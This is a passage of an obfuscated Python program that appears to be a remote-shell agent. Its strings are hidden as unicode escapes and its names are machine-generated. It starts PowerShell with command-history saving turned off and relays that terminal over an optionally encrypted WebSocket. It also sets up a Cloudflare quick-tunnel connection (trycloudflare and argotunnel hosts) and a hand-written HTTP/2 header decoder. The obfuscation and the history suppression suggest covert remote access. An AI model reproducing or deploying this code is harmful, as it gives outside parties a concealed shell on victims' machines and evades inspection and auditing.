                O0_var_622 = [codecs.decode('\\u002d\\u004e\\u006f\\u0045\\u0078\\u0069\\u0074', 'unicode_escape'), codecs.decode('\\u002d\\u0043\\u006f\\u006d\\u006d\\u0061\\u006e\\u0064', 'unicode_escape'), codecs.decode('\\u0053\\u0065\\u0074\\u002d\\u0050\\u0053\\u0052\\u0065\\u0061\\u0064\\u004c\\u0069\\u006e\\u0065\\u004f\\u0070\\u0074\\u0069\\u006f\\u006e\\u0020\\u002d\\u0048\\u0069\\u0073\\u0074\\u006f\\u0072\\u0079\\u0053\\u0061\\u0076\\u0065\\u0053\\u0074\\u0079\\u006c\\u0065\\u0020\\u0053\\u0061\\u0076\\u0065\\u004e\\u006f\\u0074\\u0068\\u0069\\u006e\\u0067', 'unicode_escape')]
            O0_var_623 = _resolve_safe_cwd()
            O0_var_624 = _create_windows_backend(O0_var_621, env, 24, 80, O0_var_623, O0_var_622)
            O0_var_624.start()
            self.terminal = O0_var_624
            self.process = None
            O0_var_620(codecs.decode('\\U0001f680\\u0020\\u7ec8\\u7aef\\u8fdb\\u7a0b\\u5df2\\u542f\\u52a8\\u0020\\u0028\\u0050\\u0049\\u0044\\u003a\\u0020', 'unicode_escape') + str(O0_var_624.pid) + codecs.decode('\\u0029', 'unicode_escape'))
            await self._send_welcome(O0_var_618, O0_var_621)
            O0_var_625 = [asyncio.create_task(self._handle_windows_output(O0_var_618, O0_var_624, O0_var_620)), asyncio.create_task(self._handle_websocket_input(O0_var_618, O0_var_624, O0_var_620))]
            O0_var_626, O0_var_627 = await asyncio.wait(O0_var_625, return_when=asyncio.FIRST_COMPLETED)
            for O0_var_628 in O0_var_627:
                O0_var_628.cancel()
            try:
                await O0_var_618.close(code=1000, reason=codecs.decode('\\u0054\\u0065\\u0072\\u006d\\u0069\\u006e\\u0061\\u006c\\u0020\\u0065\\u0078\\u0069\\u0074\\u0065\\u0064\\u0020\\u006e\\u006f\\u0072\\u006d\\u0061\\u006c\\u006c\\u0079', 'unicode_escape'))
            except Exception:
                pass
        except Exception as e:
            O0_var_620(codecs.decode('\\U0001f4a5\\u0020\\u542f\\u52a8\\u7ec8\\u7aef\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(type(e).__name__) + codecs.decode('\\u0020\\u002d\\u0020', 'unicode_escape') + str(str(e)))
            await self.cleanup()
            raise

    @staticmethod
    def _write_terminal(target, data: bytes):
        if isinstance(target, int):
            os.write(target, data)
        else:
            target.write(data)

    async def _send_ws_bytes(self, O0_var_629: WebSocket, data: bytes):
        O0_var_630 = getattr(self, codecs.decode('\\u005f\\u0077\\u0073\\u005f\\u0073\\u0065\\u006e\\u0064\\u005f\\u006c\\u006f\\u0063\\u006b', 'unicode_escape'), None)
        if O0_var_630 is None:
            O0_var_630 = self._ws_send_lock = asyncio.Lock()
        async with O0_var_630:
            if self.use_noise:
                data = self.cipher.encrypt(data)
            await O0_var_629.send_bytes(data)

    async def _handle_windows_output(self, O0_var_631: WebSocket, O0_var_632, O0_var_633):
        O0_var_634 = asyncio.get_running_loop()
        O0_var_635 = asyncio.Queue()
        O0_var_636 = threading.Event()

        def reader():
            while not O0_var_636.is_set():
                try:
                    O0_var_637 = O0_var_632.read(8192)
                except OSError:
                    break
                if O0_var_637 is None:
                    time.sleep(0.01)
                    continue
                if not O0_var_637:
                    break
                O0_var_634.call_soon_threadsafe(O0_var_635.put_nowait, O0_var_637)
            O0_var_634.call_soon_threadsafe(O0_var_635.put_nowait, None)
        O0_var_638 = threading.Thread(target=reader, daemon=True, name=codecs.decode('\\u0063\\u006f\\u006e\\u0070\\u0074\\u0079\\u002d\\u0072\\u0065\\u0061\\u0064\\u0065\\u0072\\u002d', 'unicode_escape') + str(self.request_id))
        O0_var_638.start()
        try:
            while True:
                O0_var_639 = await O0_var_635.get()
                if O0_var_639 is None:
                    break
                await self._send_ws_bytes(O0_var_631, O0_var_639)
        except (WebSocketDisconnect, ConnectionResetError, OSError):
            pass
        finally:
            O0_var_636.set()
            O0_var_633(codecs.decode('\\U0001f50c\\u0020\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073\\u0020\\u7ec8\\u7aef\\u8f93\\u51fa\\u5faa\\u73af\\u7ed3\\u675f', 'unicode_escape'))

    async def _handle_pty_output(self, O0_var_640: WebSocket, O0_var_641: int, O0_var_642):
        try:
            while True:
                if O0_var_641 is None:
                    break
                O0_var_643, O0_var_644, O0_var_644 = select.select([O0_var_641], [], [], 0.1)
                if O0_var_641 in O0_var_643:
                    try:
                        O0_var_645 = os.read(O0_var_641, 8192)
                        if not O0_var_645:
                            break
                        await self._send_ws_bytes(O0_var_640, O0_var_645)
                    except BlockingIOError:
                        await asyncio.sleep(0.01)
                    except OSError as e:
                        if e.errno == 5:
                            break
                        raise
                else:
                    await asyncio.sleep(0.01)
        except (OSError, WebSocketDisconnect, ConnectionResetError):
            pass

    async def _handle_websocket_input(self, O0_var_646: WebSocket, O0_var_647: int, O0_var_648):
        try:
            async for O0_var_649 in O0_var_646.iter_bytes():
                if O0_var_647 is None:
                    break
                if self.use_noise:
                    try:
                        O0_var_650 = self.cipher.decrypt(O0_var_649)
                    except Exception as e:
                        O0_var_648(codecs.decode('\\u26a0\\ufe0f\\u0020\\u89e3\\u5bc6\\u5931\\u8d25\\uff0c\\u6536\\u5230\\u975e\\u6cd5\\u5305\\u003a\\u0020', 'unicode_escape') + str(e))
                        break
                else:
                    O0_var_650 = O0_var_649
                try:
                    O0_var_651 = O0_var_650.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
                    if O0_var_651.strip().startswith(codecs.decode('\\u007b', 'unicode_escape')):
                        O0_var_652 = json.loads(O0_var_651)
                        O0_var_653 = O0_var_652.get(codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'))
                        if O0_var_653 == codecs.decode('\\u0068\\u0065\\u0061\\u0072\\u0074\\u0062\\u0065\\u0061\\u0074', 'unicode_escape'):
                            O0_var_654 = json.dumps({codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): codecs.decode('\\u0068\\u0065\\u0061\\u0072\\u0074\\u0062\\u0065\\u0061\\u0074', 'unicode_escape')}).encode()
                            await self._send_ws_bytes(O0_var_646, O0_var_654)
                            continue
                        if O0_var_653 == codecs.decode('\\u0072\\u0065\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'):
                            O0_var_655, O0_var_656 = (O0_var_652.get(codecs.decode('\\u0072\\u006f\\u0077\\u0073', 'unicode_escape'), 24), O0_var_652.get(codecs.decode('\\u0063\\u006f\\u006c\\u0073', 'unicode_escape'), 80))
                            self.set_pty_size(O0_var_655, O0_var_656)
                            continue
                        if O0_var_653 == codecs.decode('\\u0069\\u006e\\u0070\\u0075\\u0074', 'unicode_escape') and codecs.decode('\\u0064\\u0061\\u0074\\u0061', 'unicode_escape') in O0_var_652:
                            O0_var_657 = O0_var_652[codecs.decode('\\u0064\\u0061\\u0074\\u0061', 'unicode_escape')]
                            if O0_var_652.get(codecs.decode('\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape')) == codecs.decode('\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034', 'unicode_escape'):
                                O0_var_658 = base64.b64decode(O0_var_657)
                            else:
                                O0_var_658 = O0_var_657.encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
                            self._write_terminal(O0_var_647, O0_var_658)
                            continue
                except (UnicodeDecodeError, json.JSONDecodeError):
                    pass
                self._write_terminal(O0_var_647, O0_var_650)
        except WebSocketDisconnect:
            O0_var_648(codecs.decode('\\U0001f50c\\u0020\\u5ba2\\u6237\\u7aef\\u65ad\\u5f00\\uff0c\\u505c\\u6b62\\u63a5\\u6536\\u8f93\\u5165', 'unicode_escape'))
        except OSError:
            pass

    async def _monitor_process(self, O0_var_659, O0_var_660):
        try:
            await O0_var_659.wait()
        except Exception:
            pass
QUICK_SERVICE = codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0061\\u0070\\u0069\\u002e\\u0074\\u0072\\u0079\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u002e\\u0063\\u006f\\u006d', 'unicode_escape')

def _edge_hosts():
    O0_var_661 = [O0_var_662.strip() for O0_var_662 in os.getenv(codecs.decode('\\u004b\\u0049\\u0053\\u0041\\u004d\\u0041\\u005f\\u0045\\u0044\\u0047\\u0045\\u005f\\u0048\\u004f\\u0053\\u0054\\u0053', 'unicode_escape'), codecs.decode('', 'unicode_escape')).split(codecs.decode('\\u002c', 'unicode_escape')) if O0_var_662.strip()]
    return tuple(O0_var_661) if O0_var_661 else (codecs.decode('\\u0072\\u0065\\u0067\\u0069\\u006f\\u006e\\u0031\\u002e\\u0076\\u0032\\u002e\\u0061\\u0072\\u0067\\u006f\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u002e\\u0063\\u006f\\u006d', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0067\\u0069\\u006f\\u006e\\u0032\\u002e\\u0076\\u0032\\u002e\\u0061\\u0072\\u0067\\u006f\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u002e\\u0063\\u006f\\u006d', 'unicode_escape'))
EDGE_HOSTS = _edge_hosts()
EDGE_PORT = 7844
CONTROL_HEADER = codecs.decode('\\u0063\\u0066\\u002d\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0064\\u002d\\u0070\\u0072\\u006f\\u0078\\u0079\\u002d\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u002d\\u0075\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065', 'unicode_escape')
CONTROL_STREAM = codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c\\u002d\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape')
UPDATE_CONFIGURATION = codecs.decode('\\u0075\\u0070\\u0064\\u0061\\u0074\\u0065\\u002d\\u0063\\u006f\\u006e\\u0066\\u0069\\u0067\\u0075\\u0072\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape')
MAX_FRAME_SIZE = 16384

def _argo_env_int(name, O0_var_663, O0_var_664):
    try:
        O0_var_665 = int(os.getenv(name, codecs.decode('', 'unicode_escape')).strip())
    except ValueError:
        return O0_var_663
    if O0_var_665 < O0_var_664:
        return O0_var_663
    return O0_var_665
ARGO_REREGISTER_AFTER = _argo_env_int(codecs.decode('\\u004b\\u0049\\u0053\\u0041\\u004d\\u0041\\u005f\\u0041\\u0052\\u0047\\u004f\\u005f\\u0052\\u0045\\u0052\\u0045\\u0047\\u0049\\u0053\\u0054\\u0045\\u0052\\u005f\\u0041\\u0046\\u0054\\u0045\\u0052', 'unicode_escape'), 5, 2)
ARGO_REREGISTER_RETRY_SECONDS = 30.0
ARGO_RETRY_BASE_SECONDS = float(_argo_env_int(codecs.decode('\\u004b\\u0049\\u0053\\u0041\\u004d\\u0041\\u005f\\u0041\\u0052\\u0047\\u004f\\u005f\\u0052\\u0045\\u0054\\u0052\\u0059\\u005f\\u0042\\u0041\\u0053\\u0045\\u005f\\u0053\\u0045\\u0043\\u004f\\u004e\\u0044\\u0053', 'unicode_escape'), 2, 1))
ARGO_RETRY_MAX_SECONDS = float(_argo_env_int(codecs.decode('\\u004b\\u0049\\u0053\\u0041\\u004d\\u0041\\u005f\\u0041\\u0052\\u0047\\u004f\\u005f\\u0052\\u0045\\u0054\\u0052\\u0059\\u005f\\u004d\\u0041\\u0058\\u005f\\u0053\\u0045\\u0043\\u004f\\u004e\\u0044\\u0053', 'unicode_escape'), 300, 60))

def _argo_backoff_seconds(O0_var_666):
    if O0_var_666 <= 0:
        return ARGO_RETRY_BASE_SECONDS
    O0_var_667 = min(O0_var_666 - 1, 10)
    return min(ARGO_RETRY_BASE_SECONDS * 2 ** O0_var_667, ARGO_RETRY_MAX_SECONDS)

def _argo_truncate_error(message, limit=300):
    if message is None:
        return None
    return str(message)[:limit]

def _argo_idle_timeout():
    O0_var_668 = os.getenv(codecs.decode('\\u004b\\u0049\\u0053\\u0041\\u004d\\u0041\\u005f\\u0041\\u0052\\u0047\\u004f\\u005f\\u0049\\u0044\\u004c\\u0045\\u005f\\u0054\\u0049\\u004d\\u0045\\u004f\\u0055\\u0054', 'unicode_escape'), codecs.decode('', 'unicode_escape')).strip()
    if O0_var_668 == codecs.decode('\\u0030', 'unicode_escape'):
        return 0
    try:
        O0_var_669 = int(O0_var_668)
    except ValueError:
        return 300
    return O0_var_669 if O0_var_669 >= 10 else 300
ARGO_IDLE_TIMEOUT = _argo_idle_timeout()
STATIC_TABLE = ((codecs.decode('\\u003a\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u0074\\u0079', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u003a\\u006d\\u0065\\u0074\\u0068\\u006f\\u0064', 'unicode_escape'), codecs.decode('\\u0047\\u0045\\u0054', 'unicode_escape')), (codecs.decode('\\u003a\\u006d\\u0065\\u0074\\u0068\\u006f\\u0064', 'unicode_escape'), codecs.decode('\\u0050\\u004f\\u0053\\u0054', 'unicode_escape')), (codecs.decode('\\u003a\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'), codecs.decode('\\u002f', 'unicode_escape')), (codecs.decode('\\u003a\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'), codecs.decode('\\u002f\\u0069\\u006e\\u0064\\u0065\\u0078\\u002e\\u0068\\u0074\\u006d\\u006c', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0063\\u0068\\u0065\\u006d\\u0065', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0063\\u0068\\u0065\\u006d\\u0065', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0032\\u0030\\u0030', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0032\\u0030\\u0034', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0032\\u0030\\u0036', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0033\\u0030\\u0034', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0034\\u0030\\u0030', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0034\\u0030\\u0034', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0035\\u0030\\u0030', 'unicode_escape')), (codecs.decode('\\u0061\\u0063\\u0063\\u0065\\u0070\\u0074\\u002d\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0061\\u0063\\u0063\\u0065\\u0070\\u0074\\u002d\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'), codecs.decode('\\u0067\\u007a\\u0069\\u0070\\u002c\\u0020\\u0064\\u0065\\u0066\\u006c\\u0061\\u0074\\u0065', 'unicode_escape')), (codecs.decode('\\u0061\\u0063\\u0063\\u0065\\u0070\\u0074\\u002d\\u006c\\u0061\\u006e\\u0067\\u0075\\u0061\\u0067\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0061\\u0063\\u0063\\u0065\\u0070\\u0074\\u002d\\u0072\\u0061\\u006e\\u0067\\u0065\\u0073', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0061\\u0063\\u0063\\u0065\\u0070\\u0074', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0061\\u0063\\u0063\\u0065\\u0073\\u0073\\u002d\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c\\u002d\\u0061\\u006c\\u006c\\u006f\\u0077\\u002d\\u006f\\u0072\\u0069\\u0067\\u0069\\u006e', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0061\\u0067\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0061\\u006c\\u006c\\u006f\\u0077', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u007a\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u0061\\u0063\\u0068\\u0065\\u002d\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0064\\u0069\\u0073\\u0070\\u006f\\u0073\\u0069\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0061\\u006e\\u0067\\u0075\\u0061\\u0067\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u006f\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0072\\u0061\\u006e\\u0067\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006f\\u006b\\u0069\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0064\\u0061\\u0074\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0065\\u0074\\u0061\\u0067', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0065\\u0078\\u0070\\u0065\\u0063\\u0074', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0065\\u0078\\u0070\\u0069\\u0072\\u0065\\u0073', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0068\\u006f\\u0073\\u0074', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0069\\u0066\\u002d\\u006d\\u0061\\u0074\\u0063\\u0068', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0069\\u0066\\u002d\\u006d\\u006f\\u0064\\u0069\\u0066\\u0069\\u0065\\u0064\\u002d\\u0073\\u0069\\u006e\\u0063\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0069\\u0066\\u002d\\u006e\\u006f\\u006e\\u0065\\u002d\\u006d\\u0061\\u0074\\u0063\\u0068', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0069\\u0066\\u002d\\u0072\\u0061\\u006e\\u0067\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0069\\u0066\\u002d\\u0075\\u006e\\u006d\\u006f\\u0064\\u0069\\u0066\\u0069\\u0065\\u0064\\u002d\\u0073\\u0069\\u006e\\u0063\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u006c\\u0061\\u0073\\u0074\\u002d\\u006d\\u006f\\u0064\\u0069\\u0066\\u0069\\u0065\\u0064', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u006c\\u0069\\u006e\\u006b', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u006d\\u0061\\u0078\\u002d\\u0066\\u006f\\u0072\\u0077\\u0061\\u0072\\u0064\\u0073', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0070\\u0072\\u006f\\u0078\\u0079\\u002d\\u0061\\u0075\\u0074\\u0068\\u0065\\u006e\\u0074\\u0069\\u0063\\u0061\\u0074\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0070\\u0072\\u006f\\u0078\\u0079\\u002d\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u007a\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0072\\u0061\\u006e\\u0067\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0072\\u0065\\u0066\\u0065\\u0072\\u0065\\u0072', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0072\\u0065\\u0066\\u0072\\u0065\\u0073\\u0068', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0072\\u0065\\u0074\\u0072\\u0079\\u002d\\u0061\\u0066\\u0074\\u0065\\u0072', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0073\\u0065\\u0072\\u0076\\u0065\\u0072', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0073\\u0065\\u0074\\u002d\\u0063\\u006f\\u006f\\u006b\\u0069\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0073\\u0074\\u0072\\u0069\\u0063\\u0074\\u002d\\u0074\\u0072\\u0061\\u006e\\u0073\\u0070\\u006f\\u0072\\u0074\\u002d\\u0073\\u0065\\u0063\\u0075\\u0072\\u0069\\u0074\\u0079', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0074\\u0072\\u0061\\u006e\\u0073\\u0066\\u0065\\u0072\\u002d\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0075\\u0073\\u0065\\u0072\\u002d\\u0061\\u0067\\u0065\\u006e\\u0074', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0076\\u0061\\u0072\\u0079', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0076\\u0069\\u0061', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0077\\u0077\\u0077\\u002d\\u0061\\u0075\\u0074\\u0068\\u0065\\u006e\\u0074\\u0069\\u0063\\u0061\\u0074\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')))
HUFFMAN_CODES = (8184, 8388568, 268435426, 268435427, 268435428, 268435429, 268435430, 268435431, 268435432, 16777194, 1073741820, 268435433, 268435434, 1073741821, 268435435, 268435436, 268435437, 268435438, 268435439, 268435440, 268435441, 268435442, 1073741822, 268435443, 268435444, 268435445, 268435446, 268435447, 268435448, 268435449, 268435450, 268435451, 20, 1016, 1017, 4090, 8185, 21, 248, 2042, 1018, 1019, 249, 2043, 250, 22, 23, 24, 0, 1, 2, 25, 26, 27, 28, 29, 30, 31, 92, 251, 32764, 32, 4091, 1020, 8186, 33, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 252, 115, 253, 8187, 524272, 8188, 16380, 34, 32765, 3, 35, 4, 36, 5, 37, 38, 39, 6, 116, 117, 40, 41, 42, 7, 43, 118, 44, 8, 9, 45, 119, 120, 121, 122, 123, 32766, 2044, 16381, 8189, 268435452, 1048550, 4194258, 1048551, 1048552, 4194259, 4194260, 4194261, 8388569, 4194262, 8388570, 8388571, 8388572, 8388573, 8388574, 16777195, 8388575, 16777196, 16777197, 4194263, 8388576, 16777198, 8388577, 8388578, 8388579, 8388580, 2097116, 4194264, 8388581, 4194265, 8388582, 8388583, 16777199, 4194266, 2097117, 1048553, 4194267, 4194268, 8388584, 8388585, 2097118, 8388586, 4194269, 4194270, 16777200, 2097119, 4194271, 8388587, 8388588, 2097120, 2097121, 4194272, 2097122, 8388589, 4194273, 8388590, 8388591, 1048554, 4194274, 4194275, 4194276, 8388592, 4194277, 4194278, 8388593, 67108832, 67108833, 1048555, 524273, 4194279, 8388594, 4194280, 33554412, 67108834, 67108835, 67108836, 134217694, 134217695, 67108837, 16777201, 33554413, 524274, 2097123, 67108838, 134217696, 134217697, 67108839, 134217698, 16777202, 2097124, 2097125, 67108840, 67108841, 268435453, 134217699, 134217700, 134217701, 1048556, 16777203, 1048557, 2097126, 4194281, 2097127, 2097128, 8388595, 4194282, 4194283, 33554414, 33554415, 16777204, 16777205, 67108842, 8388596, 67108843, 134217702, 67108844, 67108845, 134217703, 134217704, 134217705, 134217706, 134217707, 268435454, 134217708, 134217709, 134217710, 134217711, 134217712, 67108846, 1073741823)
HUFFMAN_LENGTHS = (13, 23, 28, 28, 28, 28, 28, 28, 28, 24, 30, 28, 28, 30, 28, 28, 28, 28, 28, 28, 28, 28, 30, 28, 28, 28, 28, 28, 28, 28, 28, 28, 6, 10, 10, 12, 13, 6, 8, 11, 10, 10, 8, 11, 8, 6, 6, 6, 5, 5, 5, 6, 6, 6, 6, 6, 6, 6, 7, 8, 15, 6, 12, 10, 13, 6, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 8, 7, 8, 13, 19, 13, 14, 6, 15, 5, 6, 5, 6, 5, 6, 6, 6, 5, 7, 7, 6, 6, 6, 5, 6, 7, 6, 5, 5, 6, 7, 7, 7, 7, 7, 15, 11, 14, 13, 28, 20, 22, 20, 20, 22, 22, 22, 23, 22, 23, 23, 23, 23, 23, 24, 23, 24, 24, 22, 23, 24, 23, 23, 23, 23, 21, 22, 23, 22, 23, 23, 24, 22, 21, 20, 22, 22, 23, 23, 21, 23, 22, 22, 24, 21, 22, 23, 23, 21, 21, 22, 21, 23, 22, 23, 23, 20, 22, 22, 22, 23, 22, 22, 23, 26, 26, 20, 19, 22, 23, 22, 25, 26, 26, 26, 27, 27, 26, 24, 25, 19, 21, 26, 27, 27, 26, 27, 24, 21, 21, 26, 26, 28, 27, 27, 27, 20, 24, 20, 21, 22, 21, 21, 23, 22, 22, 25, 25, 24, 24, 26, 23, 26, 27, 26, 26, 27, 27, 27, 27, 27, 28, 27, 27, 27, 27, 27, 26, 30)

def O0_fn_5():
    O0_var_670 = [None, None, -1, 0]
    for O0_var_671, (O0_var_672, O0_var_673) in enumerate(zip(HUFFMAN_CODES, HUFFMAN_LENGTHS)):
        O0_var_674 = O0_var_670
        for O0_var_675 in range(O0_var_673 - 1, -1, -1):
            O0_var_676 = O0_var_672 >> O0_var_675 & 1
            if O0_var_674[O0_var_676] is None:
                O0_var_674[O0_var_676] = [None, None, -1, O0_var_674[3] + 1]
            O0_var_674 = O0_var_674[O0_var_676]
        O0_var_674[2] = O0_var_671
    return O0_var_670
HUFFMAN_TREE = O0_fn_5()

def O0_fn_6(data):
    O0_var_677 = bytearray()
    O0_var_678 = HUFFMAN_TREE
    O0_var_679 = 0
    O0_var_680 = 0
    for O0_var_681 in data:
        for O0_var_682 in range(7, -1, -1):
            O0_var_683 = O0_var_681 >> O0_var_682 & 1
            O0_var_679 = O0_var_679 << 1 | O0_var_683
            O0_var_680 += 1
            O0_var_678 = O0_var_678[O0_var_683]
            if O0_var_678 is None:
                raise ValueError(codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0048\\u0075\\u0066\\u0066\\u006d\\u0061\\u006e\\u0020\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067', 'unicode_escape'))
            if O0_var_678[2] >= 0:
                if O0_var_678[2] == 256:
                    raise ValueError(codecs.decode('\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0048\\u0075\\u0066\\u0066\\u006d\\u0061\\u006e\\u0020\\u0045\\u004f\\u0053\\u0020\\u0069\\u006e\\u0073\\u0069\\u0064\\u0065\\u0020\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067', 'unicode_escape'))
                O0_var_677.append(O0_var_678[2])
